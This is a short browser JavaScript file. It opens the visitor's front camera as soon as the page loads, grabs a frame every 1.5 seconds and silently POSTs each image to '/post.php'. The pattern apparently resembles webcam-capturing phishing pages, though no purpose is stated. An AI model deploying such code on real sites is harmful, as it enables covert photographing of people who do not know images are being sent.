'use strict';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
    audio: false,
    video: {
         facingMode: "user"
    }
};

const post = (imgdata) =>{
    $.ajax({
        type: 'POST',
        data: { cat: imgdata},
        url: '/post.php',
        dataType: 'json',
        async: false,
        success: (result) => {
         // call the function that handles the response/results
        },
        error: function(){
            errorMsgElement
        }
    });
};
 


// Success
const handleSuccess = (stream) => {
    window.stream = stream;
    video.srcObject = stream;
    
    var context = canvas.getContext('2d');
    setInterval(() => {
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);
    }, 1500);
}

// Access webcam
const init = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
         handleSuccess(stream);
    } catch (e) {
         errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
    }
}

// Load init
init();